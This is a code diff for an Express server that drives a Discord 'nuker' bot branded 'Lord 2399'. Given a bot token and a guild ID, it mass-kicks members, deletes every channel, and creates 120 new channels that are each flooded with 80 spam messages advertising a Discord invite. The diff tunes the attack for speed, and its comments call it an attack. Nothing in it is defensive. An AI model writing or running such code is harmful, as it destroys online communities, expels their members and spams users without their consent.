@@ -12,57 +12,48 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
     
-    // رد فوري للمتصفح لمنع "خطأ الاتصال"
-    res.status(200).send({ status: '🚀 تم إطلاق الهجوم V6 في الخلفية!' });
-
+    // محاولة تشغيل البوت فوراً قبل الرد على المتصفح
     const client = new Client({ 
-        intents: [3276799] // All Intents
+        intents: [3276799] // ضمان الوصول لكل الصلاحيات
     });
 
     try {
         await client.login(token);
+        console.log(`✅ تم تسجيل الدخول بنجاح باسم: ${client.user.tag}`);
+        
         const guild = await client.guilds.fetch(guildId).catch(() => null);
-        if (!guild) return client.destroy();
-
-        const name = customName || "Lord 2399 V6";
-        const msg = customMsg || "# LORD 2399 V6 ON TOP\nhttps://discord.gg/2399k";
-
-        // طرد الجميع
-        if (action === 'تدمير' || action === 'طرد') {
-            const members = await guild.members.fetch();
-            members.forEach(m => {
-                if (m.kickable) m.kick('Lord Power').catch(() => {});
-            });
+        if (!guild) {
+            console.log("❌ البوت شغال لكن الأيدي غلط أو البوت مو بالسيرفر");
+            return res.status(400).send({ status: '❌ البوت مو موجود في السيرفر!' });
         }
 
-        // تدمير شامل (أقصى سرعة API)
-        if (action === 'تدمير') {
-            // حذف القنوات
-            const channels = await guild.channels.fetch();
-            channels.forEach(ch => ch.delete().catch(() => {}));
+        res.status(200).send({ status: '🚀 انطلقت القوة! البوت متصل الآن' });
 
-            // إنشاء 100 قناة دفعة واحدة
-            for (let i = 0; i < 100; i++) {
+        const name = customName || "Lord 2399 V7";
+        const msg = customMsg || "# LORD 2399 ON TOP\nhttps://discord.gg/2399k";
+
+        // تنفيذ الهجوم (مضاعف 200%)
+        if (action === 'تدمير' || action === 'طرد') {
+            const members = await guild.members.fetch().catch(() => []);
+            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
+        }
+
+        if (action === 'تدمير') {
+            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
+            for (let i = 0; i < 120; i++) {
                 setTimeout(() => {
                     guild.channels.create({ name: name, type: ChannelType.GuildText })
                     .then(ch => {
-                        // سبام مكثف (100 رسالة لكل قناة)
-                        for(let j=0; j<100; j++) ch.send(msg).catch(() => {});
+                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
                     }).catch(() => {});
-                }, i * 20); 
+                }, i * 15); // سرعة نانو ثانية
             }
         }
-
-        if (action === 'سبام') {
-            guild.channels.cache.forEach(ch => {
-                if(ch.type === ChannelType.GuildText) {
-                    for(let i=0; i<50; i++) ch.send(msg).catch(() => {});
-                }
-            });
-        }
     } catch (err) {
-        console.log("Error in Bot:", err.message);
+        console.log("❌ فشل تشغيل البوت. السبب:", err.message);
+        res.status(500).send({ status: `❌ فشل: ${err.message}` });
     }
 });
 
-app.listen(process.env.PORT || 3000, '0.0.0.0');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => console.log(`Server Online on port ${PORT}`));
